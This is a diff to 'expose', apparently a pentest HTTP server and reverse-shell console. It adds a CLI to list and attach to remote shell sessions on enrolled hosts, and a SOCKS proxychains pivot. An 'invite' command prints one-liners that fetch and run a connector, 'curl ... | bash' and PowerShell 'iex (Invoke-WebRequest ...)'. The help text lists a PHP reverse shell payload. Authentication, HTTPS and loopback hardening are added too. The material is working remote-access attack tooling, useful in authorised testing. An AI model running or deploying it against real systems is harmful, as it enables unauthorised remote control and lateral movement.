@@ -2,7 +2,7 @@
 set -uo pipefail
 
 
-VERSION="2.0"
+VERSION="2.1"
 PORT=9090
 MODE=""
 TARGET=""
@@ -74,6 +74,11 @@ ${B}USAGE${R}
     expose [opts] ${CYN}.${R}                Serve the current directory
     expose [opts] ${CYN}--redirect <url>${R} 302 redirect all requests
     expose [opts] ${CYN}--payload <name>${R} Serve a built-in pentest payload
+    expose ${CYN}sessions${R}               List shells on a running instance
+    expose ${CYN}attach [id]${R}            Attach; Ctrl+] detaches without closing
+    expose ${CYN}invite linux|mac|win${R}   Create a short-lived enrollment command
+    expose ${CYN}login --url https://host${R} Authenticate a remote operator
+    expose ${CYN}proxychains <command>${R}  Use the running local SOCKS listener
 
 ${B}OPTIONS${R}
     -p, --port ${CYN}<port>${R}     Listen port  (default: ${PORT})
@@ -93,6 +98,7 @@ ${B}OPTIONS${R}
     --collect           Collect requests to JSONL log (dump on exit)
     --delay ${CYN}<ms>${R}        Artificial response delay in milliseconds
     -h, --help          Show this help
+    -V, --version       Show the installed build version
 
 ${B}BUILT-IN PAYLOADS${R}
     php-reverse-shell   PHP reverse shell (set LHOST, LPORT via -p)
@@ -117,10 +123,465 @@ ${B}EXAMPLES${R}
 EOF
 }
 
+# Operator commands attach to an existing instance without starting a server.
+case "${1:-}" in
+  sessions|attach|login|logout|invite|proxychains)
+    exec 3<&0
+    export EXPOSE_OPERATOR_STDIN_FD=3
+    exec python3 - "$@" <<'OPERATORPY'
+"""Authenticated CLI access to existing expose PTYs (Python standard library)."""
+import argparse
+import base64
+import getpass
+import hashlib
+import http.client
+import json
+import os
+import queue
+from pathlib import Path
+import secrets
+import select
+import shutil
+import shlex
+import signal
+import socket
+import ssl
+import stat
+import sys
+import tempfile
+import termios
+import threading
+import time
+import tty
+import urllib.parse
+from http.cookies import SimpleCookie
+
+STATE = Path.home() / '.expose'
+
+
+class OperatorError(Exception):
+    pass
+
+
+class Unauthorized(OperatorError):
+    pass
+
+
+def private_json(path):
+    fd = os.open(path, os.O_RDONLY | os.O_NOFOLLOW)
+    try:
+        info = os.fstat(fd)
+        if not stat.S_ISREG(info.st_mode) or info.st_uid != os.getuid() or info.st_mode & 0o077:
+            raise OperatorError('Private credentials must be owned by you and mode 0600.')
+        with os.fdopen(fd, 'r', closefd=False) as stream:
+            return json.load(stream)
+    finally:
+        os.close(fd)
+
+
+def save_private(path, value):
+    STATE.mkdir(parents=True, exist_ok=True, mode=0o700)
+    STATE.chmod(0o700)
+    path.parent.mkdir(parents=True, exist_ok=True, mode=0o700)
+    path.parent.chmod(0o700)
+    fd, temporary = tempfile.mkstemp(dir=path.parent)
+    try:
+        with os.fdopen(fd, 'w') as stream:
+            json.dump(value, stream)
+        os.replace(temporary, path)
+    finally:
+        if os.path.exists(temporary):
+            os.unlink(temporary)
+
+
+def validate_origin(value):
+    parsed = urllib.parse.urlsplit(value)
+    if (parsed.scheme not in ('http', 'https') or not parsed.hostname or parsed.username is not None
+            or parsed.password is not None or parsed.query or parsed.fragment or parsed.path not in ('', '/')
+            or any(ord(c) < 33 or ord(c) == 127 for c in value)):
+        raise OperatorError('Use an HTTPS origin without credentials, path, query, or fragment.')
+    if parsed.scheme == 'http' and parsed.hostname not in ('127.0.0.1', '::1', 'localhost'):
+        raise OperatorError('Remote operator access requires verified HTTPS; HTTP is allowed only on loopback.')
+    _ = parsed.port
+    return value.rstrip('/')
+
+
+def discover(origin=None):
+    selected = urllib.parse.urlsplit(origin) if origin else None
+    if selected and (selected.scheme != 'http' or selected.hostname not in ('127.0.0.1', '::1', 'localhost')):
+        return None
+    live = []
+    for path in (STATE / 'instances').glob('*.json'):
+        try:
+            instance = private_json(path)
+            os.kill(int(instance['pid']), 0)
+            validate_origin(instance['origin'])
+            if not origin or (selected.port or 80) == instance['port']:
+                live.append(instance)
+        except (FileNotFoundError, ProcessLookupError, KeyError, ValueError):
+            continue
+    if len(live) > 1:
+        raise OperatorError('Multiple local instances; select one with --url http://127.0.0.1:PORT.')
+    return live[0] if live else None
+
+
+class API:
+    def __init__(self, origin, instance=None):
+        self.origin = validate_origin(origin)
+        self.parsed = urllib.parse.urlsplit(self.origin)
+        self.instance = instance
+        self.cookie = ''
+        self.local = threading.local()
+        self.connections = []
+        self.lock = threading.Lock()
+        digest = hashlib.sha256(self.origin.encode()).hexdigest()
+        self.profile = STATE / 'operator' / (digest + '.json')
+        if self.profile.exists():
+            saved = private_json(self.profile)
+            if saved.get('origin') == self.origin:
+                self.cookie = saved.get('cookie', '')
+
+    def close(self):
+        with self.lock:
+            for connection in self.connections:
+                if connection.sock:
+                    try:
+                        connection.sock.shutdown(socket.SHUT_RDWR)
+                    except OSError:
+                        pass
+                connection.close()
+
+    def request(self, method, path, data=None, form=False):
+        connection = getattr(self.local, 'connection', None)
+        if connection is None:
+            if self.parsed.scheme == 'https':
+                connection = http.client.HTTPSConnection(self.parsed.hostname, self.parsed.port,
+                                                        timeout=17, context=ssl.create_default_context())
+            else:
+                connection = http.client.HTTPConnection(self.parsed.hostname, self.parsed.port, timeout=17)
+            self.local.connection = connection
+            with self.lock:
+                self.connections.append(connection)
+        headers = {'Content-Type': 'application/x-www-form-urlencoded' if form else 'application/json'}
+        if self.instance:
+            headers['X-Expose-Operator'] = self.instance['operator_token']
+        if self.cookie:
+            headers['Cookie'] = self.cookie
+        body = None if data is None else (urllib.parse.urlencode(data) if form else json.dumps(data))
+        try:
+            connection.request(method, path, body=body, headers=headers)
+            response = connection.getresponse()
+            content = response.read(4 * 1024 * 1024 + 1)
+            if len(content) > 4 * 1024 * 1024:
+                raise OperatorError('Server response exceeds the safety limit.')
+            if response.status == 401:
+                connection.close()
+                raise Unauthorized('Operator credentials expired or were rejected. Run expose login --url ' + self.origin)
+            if response.status == 429:
+                raise OperatorError('Server is rate limiting requests; wait and reconnect.')
+            if response.status == 303 and path not in ('/login', '/logout'):
+                raise OperatorError('Unexpected redirect; operator credentials are never forwarded.')
+            if response.status not in (200, 303):
+                raise OperatorError(f'Server rejected the request (HTTP {response.status}); redirects are never followed.')
+            return (json.loads(content) if content else None), response.getheader('Set-Cookie', '')
+        except ssl.SSLCertVerificationError:
+            connection.close()
+            raise OperatorError('HTTPS certificate verification failed; insecure TLS is not supported.')
+        except (OSError, http.client.HTTPException):
+            connection.close()
+            raise
+
+    def json(self, path, data=None):
+        return self.request('GET' if data is None else 'POST', path, data)[0]
+
+    def login(self):
+        password = os.environ.pop('EXPOSE_AUTH_PASSWORD', '')
+        if not password:
+            try:
+                with open('/dev/tty'):
+                    pass
+            except OSError:
+                raise OperatorError('Login requires an interactive terminal or EXPOSE_AUTH_PASSWORD in the environment.')
+            password = getpass.getpass('Expose password: ')
+        if not password:
+            raise OperatorError('A nonempty password is required.')
+        _, header = self.request('POST', '/login', {'password': password}, form=True)
+        del password
+        jar = SimpleCookie()
+        jar.load(header)
+        if 'expose_session' not in jar:
+            raise OperatorError('The server did not issue an authenticated session.')
+        self.cookie = 'expose_session=' + jar['expose_session'].value
+        save_private(self.profile, {'origin': self.origin, 'cookie': self.cookie})
+        save_private(STATE / 'operator/default.json', {'origin': self.origin})
+
+
+def choose_session(sessions, selector):
+    live = [session for session in sessions if session['connected']]
+    if selector:
+        if selector.isdigit() and 1 <= int(selector) <= len(live):
+            return live[int(selector) - 1]
+        matches = [session for session in live if session['id'].startswith(selector)]
+        if len(matches) != 1:
+            raise OperatorError('Session identifier is missing, closed, or ambiguous. Run expose sessions.')
+        return matches[0]
+    if len(live) == 1:
+        return live[0]
+    if not live:
+        raise OperatorError('No connected shell sessions. Enroll a connector first.')
+    show_sessions(live)
+    fd = os.open('/dev/tty', os.O_RDWR)
+    try:
+        os.write(fd, b'Attach to session number or ID: ')
+        selected = os.read(fd, 1024).decode('utf-8', errors='replace').strip()
+    finally:
+        os.close(fd)
+    if not selected:
+        raise OperatorError('No session selected; no remote session was changed.')
+    return choose_session(live, selected)
+
+
+def show_sessions(sessions):
+    index = 0
+    for session in sessions:
+        if session['connected']:
+            index += 1
+        # Connector-controlled labels cannot inject terminal escape sequences.
+        clean = lambda value: ''.join(c if c.isprintable() else '?' for c in str(value))
+        label = clean(session['host'])
+        state = 'closed' if not session['connected'] else ('stale' if session.get('stale') else 'connected')
+        number = str(index) if session['connected'] else '-'
+        print(f"{number:>2}  {clean(session['id'])}  {state:9}  {label}  {clean(session['os'])}/{clean(session['arch'])}")
+    if not sessions:
+        print('No shell sessions.')
+
+
+def attach(api, session):
+    if not os.isatty(sys.stdout.fileno()):
+        raise OperatorError('Attach requires an interactive terminal.')
+    fd = os.open('/dev/tty', os.O_RDWR)
+    previous = termios.tcgetattr(fd)
+    stop = threading.Event()
+    remote_closed = threading.Event()
+    resize = threading.Event()
+    failures = []
+    pending = queue.Queue(maxsize=128)
+    prefix = '/console/sessions/' + urllib.parse.quote(session['id'], safe='')
+
+    def input_request(action, value):
+        value['request_id'] = secrets.token_urlsafe(24)
+        deadline = time.monotonic() + 20
+        delay = .2
+        while not stop.is_set():
+            try:
+                acknowledgement = api.json(prefix + '/' + action, value)
+                if not isinstance(acknowledgement, dict) or not acknowledgement.get('ok'):
+                    raise OperatorError('Invalid input acknowledgement; detached safely.')
+                return
+            except (OSError, http.client.HTTPException):
+                if time.monotonic() >= deadline:
+                    raise OperatorError('Connection interrupted; detached safely. Reattach when the server is reachable.')
+                stop.wait(delay); delay = min(delay * 2, 2)
+
+    def writer():
+        while not stop.is_set():
+            try:
+                action, value = pending.get(timeout=.1)
+            except queue.Empty:
+                continue
+            try:
+                input_request(action, value)
+            except (OperatorError, ValueError, KeyError) as error:
+                failures.append(error); stop.set()
+
+    def enqueue(action, value):
+        try:
+            pending.put_nowait((action, value))
+        except queue.Full:
+            raise OperatorError('Input queue is full; detached without closing the remote shell.')
+
+    def output():
+        cursor = max(session.get('output_start', 0), session.get('output_end', 0) - 65536)
+        delay = .2
+        while not stop.is_set():
+            try:
+                reply = api.json(prefix + '/output?after=' + str(cursor))
+                data = base64.b64decode(reply['data'], validate=True)
+                while data and not stop.is_set():
+                    written = os.write(fd, data)
+                    data = data[written:]
+                cursor = reply['next']
+                delay = .2
+                if not reply['connected']:
+                    remote_closed.set()
+                    stop.set()
+            except (OSError, http.client.HTTPException):
+                stop.wait(delay); delay = min(delay * 2, 2)
+            except (OperatorError, ValueError, KeyError) as error:
+                failures.append(error); stop.set()
+
+    old_handlers = {}
+    thread = None
+    try:
+        for number in (signal.SIGINT, signal.SIGTERM, signal.SIGHUP):
+            old_handlers[number] = signal.signal(number, lambda *_: stop.set())
+        old_handlers[signal.SIGWINCH] = signal.signal(signal.SIGWINCH, lambda *_: resize.set())
+        print('Attached to ' + session['id'] + '. Ctrl+] detaches; Ctrl+C interrupts the remote command.', file=sys.stderr)
+        tty.setraw(fd)
+        resize.set()
+        thread = threading.Thread(target=output, daemon=True)
+        thread.start()
+        threading.Thread(target=writer, daemon=True).start()
+        while not stop.is_set():
+            if resize.is_set():
+                resize.clear()
+                size = os.get_terminal_size(fd)
+                enqueue('resize', {'cols': max(2, min(500, size.columns)),
+                                         'rows': max(2, min(200, size.lines))})
+            if select.select([fd], [], [], .1)[0]:
+                data = os.read(fd, 4096)
+                if not data:
+                    break
+                if b'\x1d' in data:
+                    before = data.split(b'\x1d', 1)[0]
+                    if before:
+                        enqueue('input', {'data_b64': base64.b64encode(before).decode()})
+                    break
+                enqueue('input', {'data_b64': base64.b64encode(data).decode()})
+    finally:
+        stop.set()
+        termios.tcsetattr(fd, termios.TCSAFLUSH, previous)
+        api.close()
+        if thread:
+            thread.join(timeout=1)
+        # Leave the local terminal usable after detaching from vim/htop too.
+        os.write(fd, b'\x1b[?2004l\x1b[?1000l\x1b[?1002l\x1b[?1003l\x1b[?1006l'
+                     b'\x1b[?1049l\x1b[?25h\x1b[0m\x1b]8;;\x1b\\')
+        os.close(fd)
+        for number, handler in old_handlers.items():
+            signal.signal(number, handler)
+        print('\nRemote shell ended.' if remote_closed.is_set() else
+              '\nCLI detached. Use expose attach to reconnect.', file=sys.stderr)
+    if failures:
+        raise failures[0]
+
+
+def main():
+    parser = argparse.ArgumentParser(prog='expose', description='Manage existing shell sessions; attach never starts or stops a server.')
+    parser.add_argument('command', choices=('sessions', 'attach', 'login', 'logout', 'invite', 'proxychains'))
+    parser.add_argument('--url', help='instance origin; remote access requires HTTPS')
+    parser.add_argument('--json', action='store_true', help='session metadata as JSON')
+    parser.add_argument('--origin', help='HTTPS public origin for a new connector invitation')
+    argv = sys.argv[1:]
+    passthrough = []
+    if argv and argv[0] == 'proxychains':
+        boundary = 3 if len(argv) > 2 and argv[1] == '--url' else 1
+        passthrough = argv[boundary:]
+        if passthrough and passthrough[0] == '--':
+            passthrough = passthrough[1:]
+        argv = argv[:boundary]
+    args, extra = parser.parse_known_args(argv)
+    extra += passthrough
+    if args.command != 'proxychains' and len(extra) > (1 if args.command in ('attach', 'invite') else 0):
+        parser.error('Unexpected arguments')
+    if any(value.startswith('-') for value in extra) and args.command != 'proxychains':
+        parser.error('Unknown option')
+    origin = validate_origin(args.url) if args.url else None
+    instance = discover(origin)
+    if not origin and instance:
+        origin = instance['origin']
+    if not origin and (STATE / 'operator/default.json').exists():
+        origin = private_json(STATE / 'operator/default.json')['origin']
+    if not origin:
+        raise OperatorError('No running local instance. Use --url https://YOUR-SERVER for remote access.')
+    api = API(origin, instance)
+    try:
+        if args.command == 'login':
+            api.login(); print('Authenticated; private session credentials saved.'); return
+        if args.command == 'logout':
+            if api.cookie:
+                api.request('POST', '/logout', {})
+            api.profile.unlink(missing_ok=True)
+            print('Saved browser/CLI login revoked. Local instance keys remain available to their owner.'); return
+        if args.command == 'proxychains':
+            if not instance or not instance.get('proxy_config'):
+                raise OperatorError('Proxychains requires a running local instance with --proxy enabled.')
+            if not extra:
+                raise OperatorError('Usage: expose proxychains COMMAND [ARGUMENTS...]')
+            path = Path(instance['proxy_config'])
+            info = path.stat()
+            if info.st_uid != os.getuid() or info.st_mode & 0o077 or path.is_symlink():
+                raise OperatorError('Proxychains credentials must be private and owned by you.')
+            binary = shutil.which('proxychains4')
+            if not binary:
+                raise OperatorError('Install proxychains-ng first.')
+            api.close()
+            os.environ.pop('EXPOSE_AUTH_PASSWORD', None)
+            original_stdin = os.environ.pop('EXPOSE_OPERATOR_STDIN_FD', None)
+            if original_stdin is not None:
+                os.dup2(int(original_stdin), 0)
+                os.close(int(original_stdin))
+            os.execv(binary, [binary, '-q', '-f', str(path), *extra])
+        try:
+            sessions = api.json('/console/sessions')
+        except Unauthorized:
+            if instance:
+                raise
+            api.login()
+            sessions = api.json('/console/sessions')
+        fields = {'id', 'host', 'os', 'arch', 'connected'}
+        if (not isinstance(sessions, list)
+                or any(not isinstance(item, dict) or not fields <= item.keys() for item in sessions)):
+            raise OperatorError('The server returned invalid session metadata.')
+        if args.command == 'invite':
+            platform = extra[0] if extra else 'linux'
+            if platform not in ('linux', 'mac', 'win'):
+                raise OperatorError('Choose invite linux, mac, or win.')
+            public = validate_origin(args.origin or (instance or {}).get('public_origin') or api.origin)
+            invite = api.json('/console/invites', {'origin': public})
+            endpoint = {'linux': '/lin', 'mac': '/mac', 'win': '/win'}[platform]
+            link = public + endpoint + '?ticket=' + invite['ticket']
+            print('Single-use connector invitation; expires in 10 minutes. Treat this command as a credential.', file=sys.stderr)
+            if platform == 'win':
+                print("iex (Invoke-WebRequest -UseBasicParsing '" + link.replace("'", "''") + "').Content")
+            else:
+                protocol = '=https' if public.startswith('https:') else '=http,https'
+                print('curl --fail --silent --show-error --max-time 30 --proto ' + shlex.quote(protocol) +
+                      ' ' + shlex.quote(link) + ' | bash')
+            return
+        if args.command == 'sessions':
+            if args.json:
+                print(json.dumps(sessions))
+            else:
+                show_sessions(sessions)
+        else:
+            if not api.json('/console/status').get('cli_attach'):
+                raise OperatorError('This running server predates CLI attach. Restart it with the updated expose when its sessions can end.')
+            attach(api, choose_session(sessions, extra[0] if extra else None))
+    finally:
+        api.close()
+
+
+if __name__ == '__main__':
+    try:
+        main()
+    except KeyboardInterrupt:
+        print('\nCancelled.', file=sys.stderr)
+        sys.exit(130)
+    except (OperatorError, OSError, ValueError, EOFError, http.client.HTTPException) as error:
+        # HTTP libraries can include URLs in errors; never include credentials or responses.
+        message = str(error) if isinstance(error, OperatorError) else 'Connection or local credential access failed.'
+        print('expose: ' + message, file=sys.stderr)
+        sys.exit(1)
+OPERATORPY
+    ;;
+esac
+
 # ── Parse arguments ──────────────────────────────────────────────────────────
 # ── Parse arguments ───────────────────────────────────────────────────────────
 while [[ $# -gt 0 ]]; do
   case "$1" in
+    --version|-V) trap - EXIT; printf 'expose %s\n' "$VERSION"; exit 0 ;;
     -h|--help)   usage; exit 0 ;;
     -m|--more)   VERBOSE=1; shift ;;
     -p|--port)   [[ -n "${2:-}" ]] || die "Missing port after $1"; PORT="$2"; shift 2 ;;
@@ -192,6 +653,13 @@ fi
 if [[ -n "$PROXY" ]]; then
   [[ "$PROXY" =~ ^(\[[0-9A-Fa-f:]+\]|[A-Za-z0-9.-]*)?:[0-9]+$ || "$PROXY" =~ ^[0-9]+$ ]] \
     || die "Invalid proxy address: $PROXY (use host:port)"
+  case "${PROXY%:*}" in
+    127.0.0.1|localhost|'[::1]') ;;
+    *) die "SOCKS must bind to loopback; use an authenticated SSH forward for remote access" ;;
+  esac
+  _proxy_port=${PROXY##*:}
+  (( ${#_proxy_port} <= 5 )) && (( 10#$_proxy_port >= 1 && 10#$_proxy_port <= 65535 )) \
+    || die "Invalid SOCKS port (must be 1–65535)"
 fi
 for _callback in "${CALLBACKS[@]}"; do
   [[ "$_callback" =~ ^[0-9]+(:[0-9]+)?$ ]] \
@@ -303,9 +771,12 @@ fi
 # ── Persistent request log ────────────────────────────────────────────────────
 _LOG_DIR="${HOME}/.expose"
 _LOGFILE="${_LOG_DIR}/requests.json"
+umask 077
 mkdir -p "$_LOG_DIR" || die "Cannot create log directory: $_LOG_DIR"
+chmod 700 "$_LOG_DIR" || die "Cannot protect log directory: $_LOG_DIR"
 [[ -f "$_LOGFILE" ]] || echo '[]' > "$_LOGFILE" \
   || die "Cannot write request log: $_LOGFILE"
+chmod 600 "$_LOGFILE" || die "Cannot protect request log: $_LOGFILE"
 # ── Collect file (JSONL) ──────────────────────────────────────────────────────
 if [[ $COLLECT -eq 1 ]]; then
   _COLLECT_FILE=$(_mktmp /tmp/expose-collect.XXXXXX)
@@ -2608,6 +3079,7 @@ class ConsoleService:
         self.callbacks = {}
         self.proxy_session = ''
         self.proxy_address = ''
+        self.proxy = None
         self.proxy_stats = {'opens': 0, 'failed': 0, 'sent': 0, 'received': 0}
         self.event_seen = {}
         self.script_tickets = {}
@@ -2638,10 +3110,11 @@ class ConsoleService:
         return value
 
     def token(self, handler):
-        return handler.headers.get('Authorization', '').removeprefix('Bearer ')
+        header = handler.headers.get('Authorization', '')
+        return header[7:] if header.startswith('Bearer ') else ''
 
     def authorized(self, handler, token):
-        return bool(token) and hmac.compare_digest(self.token(handler), token)
+        return bool(token) and hmac.compare_digest(self.token(handler).encode(), token.encode())
 
     @staticmethod
     def request_ip(handler):
@@ -2820,6 +3293,7 @@ class ConsoleService:
         with self.condition:
             session = self._net_session_locked()
             return {'enabled': bool(self.proxy_address), 'address': self.proxy_address,
+                    'auth_required': False, 'loopback_only': True,
                     'session': ({'id': session['id'], 'host': session['host']}
                                 if session else None),
                     'streams': len(session['net_streams']) if session else 0,
@@ -2836,6 +3310,7 @@ class ConsoleService:
     def start_proxy(self, bind):
         proxy = SocksProxy(self, bind)
         proxy.start()
+        self.proxy = proxy
         with self.condition:
             self.proxy_address = proxy.address
         return proxy
@@ -2977,6 +3452,8 @@ class ConsoleService:
         info = {key: session[key] for key in ('id', 'host', 'os', 'arch', 'connected', 'seen')}
         info['stale'] = time.time() - session['seen'] > self.STALE_AFTER
         info['ip'] = session.get('ip', '')
+        info['output_start'] = session['offset']
+        info['output_end'] = session['offset'] + len(session['output'])
         return info
 
     def handle(self, handler):
@@ -2986,10 +3463,31 @@ class ConsoleService:
             return False
         handler._console_body_set = False
         try:
+            # Connector tokens authorize only that connector's agent routes.
+            public_ticket = (path in ('/lin', '/mac', '/win', '/console/register',
+                                      '/console/winenum.ps1', '/console/toolrunner.ps1')
+                             or path.startswith(('/console/client/', '/console/tool/')))
+            if path.startswith('/console/agent/'):
+                ident = path.split('/')[3]
+                with self.condition:
+                    session = self.sessions.get(ident)
+                    allowed = session and self.authorized(handler, session['token'])
+                if not allowed:
+                    handler.close_connection = True
+                    self.reply(handler, 401, {'error': 'Invalid connector credentials'})
+                    return True
+                if not session['connected']:
+                    self.reply(handler, 410, {'error': 'Session closed'})
+                    return True
+            elif not public_ticket and not handler._operator_authorized():
+                handler.close_connection = True
+                self.reply(handler, 401, {'error': 'Operator authentication required'})
+                return True
             if handler.command == 'POST':
                 self.body(handler, raw=True)
             if path == '/console/status' and handler.command == 'GET':
-                self.reply(handler, 200, {'enabled': self.enabled, 'platforms': self.available()})
+                self.reply(handler, 200, {'enabled': self.enabled, 'platforms': self.available(),
+                                          'cli_attach': True, 'protocol': 2})
                 return True
             if not self.enabled:
                 handler.close_connection = True
@@ -3074,7 +3572,8 @@ class ConsoleService:
                 self.remove_callback(parts[2])
                 self.reply(handler, 200, {'ok': True})
                 return True
-            if len(parts) == 6 and parts[:2] == ['console', 'agent'] and parts[3] == 'callback':
+            if (len(parts) == 6 and parts[:2] == ['console', 'agent'] and parts[3] == 'callback'
+                    and parts[5] == 'state' and handler.command == 'POST'):
                 if not self.set_callback_state(parts[2], parts[4], self.body(handler)):
                     self.reply(handler, 404, {'error': 'Callback not found'})
                 else:
@@ -3092,9 +3591,12 @@ class ConsoleService:
             elif path == '/console/invites' and handler.command == 'POST':
                 data = self.body(handler)
                 url = urllib.parse.urlsplit(data.get('origin', ''))
-                if (url.scheme not in ('http', 'https') or not url.hostname or url.username
-                        or url.password or url.path not in ('', '/') or url.query or url.fragment):
+                if (url.scheme not in ('http', 'https') or not url.hostname or url.username is not None
+                        or url.password is not None or url.path not in ('', '/') or url.query or url.fragment):
                     raise ValueError('Use an HTTP(S) origin without a path')
+                _ = url.port
+                if url.scheme == 'http' and url.hostname not in ('localhost', '127.0.0.1', '::1'):
+                    raise ValueError('Remote connectors require HTTPS; HTTP is allowed only on loopback')
                 with self.condition:
                     if len(self.invites) >= 32:
                         raise ValueError('Too many active connection links; wait for them to expire')
@@ -3140,7 +3642,7 @@ class ConsoleService:
                        'os': str(data.get('os', ''))[:20], 'arch': str(data.get('arch', ''))[:20],
                        'ip': self.request_ip(handler),
                        'connected': True, 'seen': time.time(), 'events': [], 'seq': 0,
-                       'output': bytearray(), 'offset': 0, 'input_size': 0,
+                       'output': bytearray(), 'offset': 0, 'input_size': 0, 'operator_requests': {},
                        'net_seq': 0, 'net_events': [], 'net_streams': {}}
             self.sessions[ident] = session
             self.registrations[ticket] = {'nonce': nonce, 'id': ident, 'token': token,
@@ -3311,13 +3813,28 @@ class ConsoleService:
                 else:
                     if not session['connected']:
                         self.reply(handler, 410, {'error': 'Session closed'}); return
+                    request_id = data.get('request_id', '')
+                    if not isinstance(request_id, str) or len(request_id) > 64:
+                        raise ValueError('Invalid request identifier')
+                    if request_id and request_id in session['operator_requests']:
+                        self.reply(handler, 200, {'ok': True, 'duplicate': True}); return
+                    now = time.monotonic()
+                    requests = session['operator_requests']
+                    while requests and next(iter(requests.values())) < now - 120:
+                        requests.pop(next(iter(requests)))
+                    if request_id and len(requests) >= 8192:
+                        self.reply(handler, 429, {'error': 'Retry safety cache is full'}); return
                     if len(session['events']) >= 256:
                         self.reply(handler, 429, {'error': 'Input queue is full'}); return
                     event = {}
                     if action == 'input':
-                        raw = data.get('data', '')
-                        if not isinstance(raw, str): raise ValueError('Invalid input')
-                        encoded = base64.b64encode(raw.encode()).decode()
+                        if 'data_b64' in data:
+                            raw = base64.b64decode(data['data_b64'], validate=True)
+                        else:
+                            raw = data.get('data', '')
+                            if not isinstance(raw, str): raise ValueError('Invalid input')
+                            raw = raw.encode()
+                        encoded = base64.b64encode(raw).decode()
                         if session['input_size'] + len(encoded) > 65536:
                             self.reply(handler, 429, {'error': 'Input queue is full'}); return
                         event['data'] = encoded
@@ -3328,6 +3845,8 @@ class ConsoleService:
                         event['cols'], event['rows'] = cols, rows
                     session['seq'] += 1
                     event['seq'] = session['seq']; session['events'].append(event)
+                    if request_id:
+                        session['operator_requests'][request_id] = now
                 self.condition.notify_all()
             self.reply(handler, 200, {'ok': True})
         else:
@@ -3435,13 +3954,17 @@ class SocksProxy:
 
     def start(self):
         host, port = self.parse_bind(self.bind)
+        if not 1 <= port <= 65535:
+            raise ValueError('Invalid proxy port')
+        if host not in ('127.0.0.1', '::1', 'localhost'):
+            raise ValueError('The SOCKS proxy must bind to loopback; use an authenticated SSH forward for remote access')
         family = socket.AF_INET6 if ':' in host else socket.AF_INET
         listener = socket.socket(family, socket.SOCK_STREAM)
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         listener.bind((host, port))
         listener.listen(128)
         self.sock = listener
-        shown = '127.0.0.1' if host in ('', '0.0.0.0') else host
+        shown = f'[{host}]' if ':' in host else host
         self.address = f'socks5://{shown}:{port}'
         threading.Thread(target=self.serve, daemon=True).start()
         return self
@@ -3880,6 +4403,7 @@ _export_common() {
 serve_http() {
   _export_common
   python3 <<'PYEOF'
+import atexit
 import datetime
 import email.parser
 import email.policy
@@ -3899,9 +4423,11 @@ import socketserver
 import stat
 import sys
 import threading
+import tempfile
 import time
 import urllib.parse
 from http import cookies
+from pathlib import Path
 
 port = int(os.environ["EXPOSE_PORT"])
 bind_addr = os.environ.get("EXPOSE_BIND", "0.0.0.0")
@@ -3917,6 +4443,7 @@ chat_file = os.environ.get("EXPOSE_CHAT_FILE", "")
 content_path = os.environ.get("EXPOSE_CONTENT", "")
 content_mime = os.environ.get("EXPOSE_MIME", "application/octet-stream")
 content_name = os.environ.get("EXPOSE_FILENAME", "")
+share_root = Path.cwd().resolve()
 response_code = int(os.environ.get("EXPOSE_RESP_CODE", "200"))
 redirect_url = os.environ.get("EXPOSE_REDIRECT", "")
 delay_seconds = int(os.environ.get("EXPOSE_DELAY_MS", "0")) / 1000
@@ -3941,6 +4468,7 @@ except OSError:
 
 # ── Authentication ───────────────────────────────────────────────────────────
 auth_password = os.environ.get('EXPOSE_AUTH_PASSWORD', '')
+operator_token = secrets.token_urlsafe(32)
 auth_sessions = {}
 auth_failures = {}
 auth_lock = threading.Lock()
@@ -4016,6 +4544,11 @@ def redact_path(path):
     pairs = [(key, '***' if key == 'ticket' else value) for key, value in pairs]
     return urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path,
                                     urllib.parse.urlencode(pairs), parsed.fragment))
+
+def redact_header(name, value):
+    if name.lower() in ('cookie', 'authorization', 'proxy-authorization', 'x-expose-operator'):
+        return '[redacted]'
+    return value
 
 def event(kind, message, ip=''):
     sys.stderr.write(f"{datetime.datetime.now().strftime('%H:%M:%S')}  "
@@ -4206,7 +4739,29 @@ def _append_chat(msg, attachments=None):
 class Handler(http.server.SimpleHTTPRequestHandler):
     protocol_version = "HTTP/1.1"
 
+    def safe_shared_path(self, path):
+        candidate = Path(path)
+        try:
+            resolved = candidate.resolve()
+            resolved.relative_to(share_root)
+        except (ValueError, OSError, RuntimeError):
+            return False
+        # Include absolute resolved components: sharing from within ~/.expose
+        # must not turn its instance keys into public files either.
+        return not any(part.startswith('.') for part in candidate.absolute().parts + resolved.parts)
+
+    def send_head(self):
+        if mode != 'dir':
+            self.send_error(405)
+            return None
+        if not self.safe_shared_path(self.translate_path(self.path)):
+            self.send_error(403)
+            return None
+        return super().send_head()
+
     def end_headers(self):
+        if self.close_connection:
+            self.send_header('Connection', 'close')
         self.send_header("Server", "expose")
         self.send_header("Cache-Control", "no-store")
         self.send_header("X-Frame-Options", "DENY")
@@ -4318,6 +4873,23 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         return f'{AUTH_COOKIE}={token}; Path=/; HttpOnly; SameSite=Strict; Max-Age={AUTH_TTL}{secure}'
 
     def _authorized(self):
+        path = urllib.parse.urlsplit(self.path).path
+        if (path == '/console/status' and self.command == 'GET' and not auth_password
+                and not self._operator_authorized()):
+            # The public file-sharing UI probes this endpoint on startup. Do not
+            # redirect that UI into a login loop or disclose operator metadata.
+            self._send(200, json.dumps({'enabled': False, 'platforms': [],
+                                       'authentication_required': True}), 'application/json')
+            return False
+        console_operator = (path.startswith('/console/')
+                            and not path.startswith(('/console/agent/', '/console/client/', '/console/tool/'))
+                            and path not in ('/console/register', '/console/winenum.ps1', '/console/toolrunner.ps1'))
+        if console_operator:
+            if self._operator_authorized():
+                return True
+            self.close_connection = True
+            self._send(401, json.dumps({'error': 'Operator authentication required'}), 'application/json')
+            return False
         if not auth_password:
             return True
         path = urllib.parse.urlsplit(self.path).path
@@ -4340,6 +4912,24 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             self._send(401, json.dumps({'error': 'Password required'}),
                        'application/json', LOGIN_HEADERS)
         return False
+
+    def _local_operator(self):
+        # The local capability never authorizes forwarded requests from a tunnel.
+        return (self.client_address[0] in ('127.0.0.1', '::1')
+                and not any(self.headers.get(name) for name in
+                            ('X-Forwarded-For', 'X-Real-IP', 'Forwarded'))
+                and hmac.compare_digest(self.headers.get('X-Expose-Operator', '').encode(),
+                                        operator_token.encode()))
+
+    def _operator_authorized(self):
+        origin = self.headers.get('Origin')
+        if origin:
+            parsed = urllib.parse.urlsplit(origin)
+            if parsed.netloc != self.headers.get('Host') or parsed.scheme not in ('http', 'https'):
+                return False
